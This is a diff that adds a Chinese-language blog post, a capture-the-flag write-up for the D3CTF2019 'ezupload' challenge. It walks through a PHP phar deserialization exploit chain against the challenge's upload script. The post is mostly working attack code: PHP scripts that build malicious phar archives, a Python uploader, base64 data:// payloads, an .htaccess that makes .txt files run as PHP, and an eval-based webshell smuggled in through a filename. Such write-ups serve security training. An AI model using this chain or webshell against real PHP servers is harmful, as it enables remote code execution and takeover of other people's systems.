@@ -131,6 +131,204 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/10/D3CTF2019-ezupload/" >D3CTF2019-ezupload</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-10
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1203">题目链接</a></p>
+<p>访问得到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userdir = <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename  =  <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;userdir != <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|php/i&quot;</span>,<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$this</span>-&gt;filename, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkurl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you have <span class="subst">$num</span> files&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you don&#x27;t have file&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : &quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;count&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用post传入的 <code>url</code> 和 <code>filename</code> 创建dir对象</p>
+<p>upload: </p>
+<ol>
+<li>目录检查：是否被改</li>
+<li>url检查 ：必须包含scheme，且scheme不能包含 <code>file</code> 或 <code>php</code> ，但没有过滤 <code>data</code> 和 <code>phar</code> </li>
+<li>文件名后缀检查：不能包含ph</li>
+<li><code>file_get_contents</code> 获取url中的内容并过滤，<code>&lt;</code> 会被过滤，看来木马无法直接从内容上传</li>
+<li><code>file_put_contents</code> 将内容存入userdir&#x2F;filename</li>
+</ol>
+<p>count:</p>
+<p>展示上传目录文件数量，调用的话会发现文件会被定时删除</p>
+<p><strong>phar反序列化</strong></p>
+<blockquote>
+<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
+</blockquote>
+<p>phar文件为php归档文件，相当于压缩包，可以存放多个文件，在被某些触发函数解析时 其中的MetaData会自动被反序列化（漏洞）</p>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">触发函数（部分）</th>
+<th align="center"></th>
+<th align="center"></th>
+<th align="center"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file_get_content</td>
+<td align="center">filectime</td>
+<td align="center">file_exists</td>
+<td align="center">file_get_contents</td>
+</tr>
+<tr>
+<td align="center">fileatime</td>
+<td align="center">file_put_contents</td>
+<td align="center">file</td>
+<td align="center">filegroup</td>
+</tr>
+<tr>
+<td align="center">fopen</td>
+<td align="center">fileinode</td>
+<td align="center">unlink</td>
+<td align="center">stat</td>
+</tr>
+<tr>
+<td align="center">fileowner</td>
+<td align="center">fileperms</td>
+<td align="center">is_dir</td>
+<td align="center">is_executable</td>
+</tr>
+<tr>
+<td align="center">is_file</td>
+<td align="center">copy</td>
+<td align="center">stat</td>
+<td align="center">readfile</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><code>$string = &quot;your file in : &quot;.$this-&gt;userdir;</code> 有可能触发 <code>__toString</code>，查看目录信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">/**按照攻击链条构造对象***/</span></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;../&#x27;</span>;	</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line"><span class="comment">/***其余部分可作为模板***/</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将要反序列化的对象存入meta-data</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>执行后生成 <code>phar.phar</code>文件，改为<code>phar.gif</code> </p>
+<p>上传脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">purl, filename, action</span>):</span><br><span class="line">    post_data = &#123;<span class="string">&quot;url&quot;</span>: purl, <span class="string">&quot;filename&quot;</span>: filename, <span class="string">&quot;action&quot;</span>: action&#125;</span><br><span class="line">    response = requests.post(<span class="string">&quot;http://node2.anna.nssctf.cn:28055/&quot;</span>, data=post_data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>可以用VPS上传至服务器，然后传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;http://xx.xx.xx.xx/phar.gif&#x27;</span>, <span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>或直接获取base64编码然后用<code>data</code>伪协议上传</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">base64</span> phar.phar</span><br><span class="line">&lt; R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86Mzoi</span><br><span class="line">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4v</span><br><span class="line">IjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1l</span><br><span class="line">IjtOO30IAAAAdGVzdC50eHQEAAAAZ5vUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0blKehuzjSYAVLkjn</span><br><span class="line">JV2RJv5biehmVwrY/PBuUG3FIoQDAAAAR0JNQg==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;&#x27;&#x27;data://image/gif;base64,R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86Mzoi</span></span><br><span class="line"><span class="string">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4v</span></span><br><span class="line"><span class="string">IjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1l</span></span><br><span class="line"><span class="string">IjtOO30IAAAAdGVzdC50eHQEAAAAZ5vUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0blKehuzjSYAVLkjn</span></span><br><span class="line"><span class="string">JV2RJv5biehmVwrY/PBuUG3FIoQDAAAAR0JNQg==&#x27;&#x27;&#x27;</span></span><br><span class="line">getinfo(url, <span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到上传到目录 <code>upload/e0ee64a13ff7a0b04333c1d51fbbeadf</code></p>
+</li>
+<li><p>上传<code>.htaccess</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;data://text/plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line"><span class="comment"># 内容为：AddHandler php7-script .txt</span></span><br><span class="line"><span class="comment"># 因为 &lt; 被过滤，这同样可以达到效果，将txt解释为php</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>现在有了phar文件，可以传phar:&#x2F;&#x2F;，在<code>file_get_contents</code>中触发反序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;phar://upload/e0ee64a13ff7a0b04333c1d51fbbeadf/phar.gif&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>your file in : upload/e0ee64a13ff7a0b04333c1d51fbbeadfyour file in : . .. 887a185b1a408019your file in : ../</code></p>
+<p>所以上传文件夹绝对路径为 <code>/var/html/www/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf</code></p>
+</li>
+<li><p>现在还是通过反序列化使得此文件夹中某个文件包含木马</p>
+<p>由</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : &quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见<code>string</code> 和 <code>filename</code> 均可控，让 <code>string</code>中包含木马即可</p>
+</li>
+</ul>
+<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><ul>
+<li><p>上传木马名称文件（文件名没有过滤那么严）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;data://image/gif;base64,R0lG&#x27;</span>, <span class="string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;.txt&quot;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这时，当前文件夹下就包含有<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;.txt</code>，再类似前步反序列化展示文件夹下内容，然后就写到txt文件中</p>
+</li>
+<li><p>phar构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&quot;/upload/e0ee64a13ff7a0b04333c1d51fbbeadf&quot;</span>;</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line">   <span class="variable">$o</span>-&gt;filename=<span class="string">&quot;/var/www/html/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell&quot;</span>;	<span class="comment">//最后会生成webshell.txt</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将要反序列化的对象存入meta-data</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与前面操作相同</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;&#x27;&#x27;data://image/gif;base64,R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KLQEAAAEAAAARAAAAAQAAAAAA9wAAAE86Mzoi</span></span><br><span class="line"><span class="string">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6NDA6Ii91</span></span><br><span class="line"><span class="string">cGxvYWQvZTBlZTY0YTEzZmY3YTBiMDQzMzNjMWQ1MWZiYmVhZGYiO3M6MzoidXJsIjtOO3M6ODoi</span></span><br><span class="line"><span class="string">ZmlsZW5hbWUiO047fXM6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO3M6Nzk6Ii92YXIvd3d3L2h0</span></span><br><span class="line"><span class="string">bWwvODg3YTE4NWIxYTQwODAxOS91cGxvYWQvZTBlZTY0YTEzZmY3YTBiMDQzMzNjMWQ1MWZiYmVh</span></span><br><span class="line"><span class="string">ZGYvd2Vic2hlbGwiO30IAAAAdGVzdC50eHQEAAAATurUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0Nw1j</span></span><br><span class="line"><span class="string">IHqtIaW4cyxLqtXaivqqZtUhOAJTZ2M8GgeF7DoDAAAAR0JNQg==&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">getinfo(purl, <span class="string">&quot;phar2.gif&quot;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">getinfo(<span class="string">&#x27;phar://upload/e0ee64a13ff7a0b04333c1d51fbbeadf/phar2.gif&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
